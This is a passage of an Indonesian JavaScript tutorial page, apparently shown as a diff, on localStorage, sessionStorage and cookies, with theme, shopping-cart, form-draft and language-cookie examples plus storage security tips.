+<li>Simpan token di cookie <strong><code>HttpOnly</code></strong> + <strong><code>Secure</code></strong> + <strong><code>SameSite</code></strong> — tidak bisa diakses JavaScript.</li>
+<li>Terapkan <strong>CSRF protection</strong> (misalnya CSRF token).</li>
+<li>Gunakan <strong>Content Security Policy</strong> (CSP) untuk memitigasi XSS.</li>
+<li>Sanitasi semua input user.</li>
+</ul>
+<hr>
+<h2 id="contoh-praktis">Contoh Praktis <a href="#contoh-praktis" class="anchor" aria-hidden="true">#</a></h2>
+<h3 id="1-tema-darklight-dengan-localstorage">1. Tema Dark/Light dengan <code>localStorage</code> <a href="#1-tema-darklight-dengan-localstorage" class="anchor" aria-hidden="true">#</a></h3>
+<pre><code class="language-javascript">// Terapkan tema saat halaman dimuat
+function terapkanTema(tema) {
+  document.body.classList.toggle(&quot;dark-mode&quot;, tema === &quot;dark&quot;);
+  btnTema.textContent = tema === &quot;dark&quot; ? &quot;☀️&quot; : &quot;🌙&quot;;
+}
+
+// Muat preferensi
+const temaTersimpan = localStorage.getItem(&quot;tema&quot;) || &quot;light&quot;;
+terapkanTema(temaTersimpan);
+
+// Toggle
+btnTema.addEventListener(&quot;click&quot;, () =&gt; {
+  const temaBaru = document.body.classList.contains(&quot;dark-mode&quot;) ? &quot;light&quot; : &quot;dark&quot;;
+  localStorage.setItem(&quot;tema&quot;, temaBaru);
+  terapkanTema(temaBaru);
+});
+
+// Sinkronisasi antar tab
+window.addEventListener(&quot;storage&quot;, (e) =&gt; {
+  if (e.key === &quot;tema&quot;) terapkanTema(e.newValue);
+});
+</code></pre>
+<h3 id="2-keranjang-belanja-dengan-localstorage">2. Keranjang Belanja dengan <code>localStorage</code> <a href="#2-keranjang-belanja-dengan-localstorage" class="anchor" aria-hidden="true">#</a></h3>
+<pre><code class="language-javascript">const keranjang = {
+  items: JSON.parse(localStorage.getItem(&quot;keranjang&quot;) || &quot;[]&quot;),
+
+  simpan() {
+    localStorage.setItem(&quot;keranjang&quot;, JSON.stringify(this.items));
+  },
+
+  tambah(produk) {
+    const existing = this.items.find(i =&gt; i.id === produk.id);
+    if (existing) {
+      existing.jumlah++;
+    } else {
+      this.items.push({ ...produk, jumlah: 1 });
+    }
+    this.simpan();
+    this.render();
+  },
+
+  hapus(id) {
+    this.items = this.items.filter(i =&gt; i.id !== id);
+    this.simpan();
+    this.render();
+  },
+
+  total() {
+    return this.items.reduce((sum, i) =&gt; sum + i.harga * i.jumlah, 0);
+  },
+
+  render() {
+    const container = document.querySelector(&quot;#keranjang&quot;);
+    container.innerHTML = &quot;&quot;;
+    this.items.forEach(item =&gt; {
+      const div = document.createElement(&quot;div&quot;);
+      div.textContent = `${item.nama} x${item.jumlah} = Rp${item.harga * item.jumlah}`;
+      container.appendChild(div);
+    });
+
+    const totalEl = document.querySelector(&quot;#total&quot;);
+    totalEl.textContent = `Total: Rp${this.total().toLocaleString(&quot;id-ID&quot;)}`;
+  }
+};
+
+keranjang.render();
+</code></pre>
+<h3 id="3-form-draft-dengan-sessionstorage">3. Form Draft dengan <code>sessionStorage</code> <a href="#3-form-draft-dengan-sessionstorage" class="anchor" aria-hidden="true">#</a></h3>
+<pre><code class="language-javascript">const form = document.querySelector(&quot;#form-produk&quot;);
+const DRAFT_KEY = &quot;draft-produk&quot;;
+
+// Simpan draft saat input berubah
+form.addEventListener(&quot;input&quot;, () =&gt; {
+  const data = Object.fromEntries(new FormData(form));
+  sessionStorage.setItem(DRAFT_KEY, JSON.stringify(data));
+});
+
+// Restore draft saat dimuat
+window.addEventListener(&quot;DOMContentLoaded&quot;, () =&gt; {
+  const draft = sessionStorage.getItem(DRAFT_KEY);
+  if (!draft) return;
+
+  const data = JSON.parse(draft);
+  Object.entries(data).forEach(([name, value]) =&gt; {
+    const input = form.elements[name];
+    if (input) input.value = value;
+  });
+});
+
+// Hapus draft setelah submit
+form.addEventListener(&quot;submit&quot;, (e) =&gt; {
+  e.preventDefault();
+  // ... proses submit ...
+  sessionStorage.removeItem(DRAFT_KEY);
+  form.reset();
+});
+</code></pre>
+<h3 id="4-menyimpan-preferensi-user-dengan-cookie">4. Menyimpan Preferensi User dengan Cookie <a href="#4-menyimpan-preferensi-user-dengan-cookie" class="anchor" aria-hidden="true">#</a></h3>
+<pre><code class="language-javascript">// Simpan bahasa
+function setBahasa(lang) {
+  document.cookie = `bahasa=${lang}; max-age=${365 * 24 * 60 * 60}; path=/; SameSite=Lax`;
+}
+
+// Baca bahasa
+function getBahasa() {
+  const match = document.cookie.match(/(?:^|;\s*)bahasa=([^;]*)/);
+  return match ? decodeURIComponent(match[1]) : &quot;id&quot;;
+}
+
+// Ganti bahasa
+document.querySelector(&quot;#pilih-bahasa&quot;).addEventListener(&quot;change&quot;, (e) =&gt; {
+  setBahasa(e.target.value);
+  location.reload(); // reload untuk menerapkan
+});
+</code></pre>
+<hr>
+<h2 id="tips--best-practice">Tips &amp; Best Practice <a href="#tips--best-practice" class="anchor" aria-hidden="true">#</a></h2>
+<ol>
+<li>
+<p><strong>Gunakan <code>localStorage</code></strong> untuk preferensi &amp; data non-sensitif yang perlu permanen.</p>
+</li>
+<li>
+<p><strong>Gunakan <code>sessionStorage</code></strong> untuk data sementara per tab (draft, state wizard).</p>
+</li>
+<li>
+<p><strong>Gunakan cookie</strong> hanya untuk data yang perlu dikirim ke server (session ID, preferensi server).</p>
+</li>
+<li>
+<p><strong>Jangan simpan token autentikasi</strong> di <code>localStorage</code>/<code>sessionStorage</code> — gunakan cookie <code>HttpOnly</code>.</p>
+</li>
+<li>
+<p><strong>Selalu gunakan <code>JSON.stringify()</code>/<code>JSON.parse()</code></strong> untuk object/array.</p>
+</li>
+<li>
+<p><strong>Bungkus dengan <code>try/catch</code></strong> — <code>localStorage</code> bisa throw error (quota, private mode).</p>
+</li>
+<li>
+<p><strong>Sanitasi data</strong> sebelum menampilkan — jangan gunakan <code>innerHTML</code> dengan data dari storage.</p>
+</li>
+<li>
+<p><strong>Untuk data besar</strong> (&gt; 5 MB), gunakan <strong>IndexedDB</strong> (atau <code>localForage</code>).</p>
+</li>
+<li>
+<p><strong>Bersihkan data lama</strong> — hapus data yang tidak lagi diperlukan untuk menghindari penumpukan.</p>
+</li>
+<li>
+<p><strong>Gunakan <code>SameSite=Lax</code></strong> (default) untuk cookie — mitigasi CSRF.</p>
+</li>
+</ol>
+<hr>
+<h2 id="ringkasan">Ringkasan <a href="#ringkasan" class="anchor" aria-hidden="true">#</a></h2>
+<table>
+<thead>
+<tr>
+<th>Mekanisme</th>
+<th>Kapasitas</th>
+<th>Masa Hidup</th>
+<th>Dikirim ke Server</th>
+<th>Kasus Penggunaan</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>localStorage</code></td>
+<td>~5–10 MB</td>
+<td>Permanen</td>
+<td>❌</td>
+<td>Preferensi, keranjang, cache</td>
+</tr>
+<tr>
+<td><code>sessionStorage</code></td>
+<td>~5 MB</td>
+<td>Per tab</td>
+<td>❌</td>
+<td>Draft form, state sementara</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>~4 KB</td>
+<td>Bisa diatur</td>
+<td>✅</td>
+<td>Session ID, preferensi server</td>
+</tr>
+<tr>
+<td>IndexedDB</td>
+<td>~50 MB+</td>
+<td>Permanen</td>
+<td>❌</td>
+<td>Data besar, file, cache offline</td>
+</tr>
+</tbody>
+</table>
+<p>Poin penting:</p>
+<ul>
+<li><strong><code>localStorage</code>/<code>sessionStorage</code> hanya string</strong> — gunakan JSON untuk object.</li>
+<li><strong>Cookie</strong> dikirim ke server setiap request — jangan simpan data besar di cookie.</li>
+<li><strong>Jangan simpan token autentikasi di <code>localStorage</code></strong> — rentan XSS. Gunakan cookie <code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code>.</li>
+<li><strong><code>sessionStorage</code></strong> terpisah per tab — cocok untuk draft form.</li>
+<li><strong>Event <code>storage</code></strong> memungkinkan sinkronisasi antar tab.</li>
+<li><strong>IndexedDB</strong> untuk data besar (&gt; 5 MB) — API kompleks, gunakan library seperti <code>idb</code>/<code>localForage</code>.</li>
+<li>Selalu <strong>sanitasi</strong> data dari storage sebelum menampilkan.</li>
+</ul>
+<p>Pada artikel berikutnya, kita akan membahas <strong>ES6+ Fitur Modern</strong> — <code>let</code>/<code>const</code>, template literal, destructuring, spread, module, class, dan lainnya.</p>
+
+			<div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between">
+				</div>
+			<div class="docs-navigation d-flex justify-content-between">
+	
+	<a href="/javascript/tutorial/10-event-handling/">
+			<div class="card my-1">
+				<div class="card-body py-2">
+					&larr; Event &amp; Event Handling
+				</div>
+			</div>
+		</a>
+	<a class="ms-auto" href="/javascript/tutorial/12-es6-modern/">
+			<div class="card my-1">
+				<div class="card-body py-2">
+					ES6&#43; Fitur Modern &rarr;
+				</div>
+			</div>
+		</a>
+	</div>
+
+			
+		</main>
+	</div>
+
+      </div>
+    </div>
+    
+    
+    <footer class="footer text-muted">
+  <div class="container-xxl">
+    <div class="row">
+      <div class="col-lg-8 order-last order-lg-first">
+        <ul class="list-inline">
+          <li class="list-inline-item">Powered by <a class="text-muted" href="https://gohugo.io/">Hugo</a> and <a class="text-muted" href="https://github.com/">Github</a></li>
+        </ul>
+      </div>
+      <div class="col-lg-8 order-first order-lg-last text-lg-end">
+        <ul class="list-inline">
+          </ul>
+      </div>
+    </div>
+  </div>
+</footer>
+    
+
+<script src="/js/bootstrap.min.650aeec64c81d69d4c0850fc73c93da3f0330cec0a27772feed7f90f60baa5f47f1c45687d71914bdafd1c4e860d40f6dc08ede27a2f08431ff929c9a2d24621.js" integrity="sha512-ZQruxkyB1p1MCFD8c8k9o/AzDOwKJ3cv7tf5D2C6pfR/HEVofXGRS9r9HE6GDUD23Ajt4novCEMf&#43;SnJotJGIQ==" crossorigin="anonymous" defer></script>
+  <script src="/js/highlight.min.ec234bd8a5f487aaffe50a89f17b14501b1bb65633cf177cffd4cb84702dd7030edc08712dceb8dc27ac7e54b53240a08bf0b8d951572ee582bcdbbd06a48a7b.js" integrity="sha512-7CNL2KX0h6r/5QqJ8XsUUBsbtlYzzxd8/9TLhHAt1wMO3AhxLc643CesflS1MkCgi/C42VFXLuWCvNu9BqSKew==" crossorigin="anonymous" defer></script>
+  <script src="/main.min.cd1e5e6b40065b3f7f7fd8548a528fac67019754eda0f37b9918d02d154fc9ef6a22742f6513b0572ad9163152e151ec36221fbeafbecd7759c3dab1f19b64b9.js" integrity="sha512-zR5ea0AGWz9/f9hUilKPrGcBl1TtoPN7mRjQLRVPye9qInQvZROwVyrZFjFS4VHsNiIfvq&#43;&#43;zXdZw9qx8ZtkuQ==" crossorigin="anonymous" defer></script>
+  <script src="https://kaban.my.id/index.min.3b38957cbdd3fcd9f9b6e3e14d11e41821e75e9e633e2e7fc92b39e052142003d54a01433bc318b5180cbdf345e1654d731e00e168a3ab02cdad8965a4e5d852.js" integrity="sha512-OziVfL3T/Nn5tuPhTRHkGCHnXp5jPi5/ySs54FIUIAPVSgFDO8MYtRgMvfNF4WVNcx4A4WijqwLNrYllpOXYUg==" crossorigin="anonymous" defer></script>
+  
+    <div class="d-flex fixed-bottom pb-4 pb-lg-5 pe-4 pe-lg-5">
+      <a id="toTop" href="#" class="btn btn-outline-primary rounded-circle ms-auto p-2"><span class="visually-hidden">Top</span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-up"><polyline points="18 15 12 9 6 15"></polyline></svg></a>
+    </div>
+    
+  </body>
+</html>
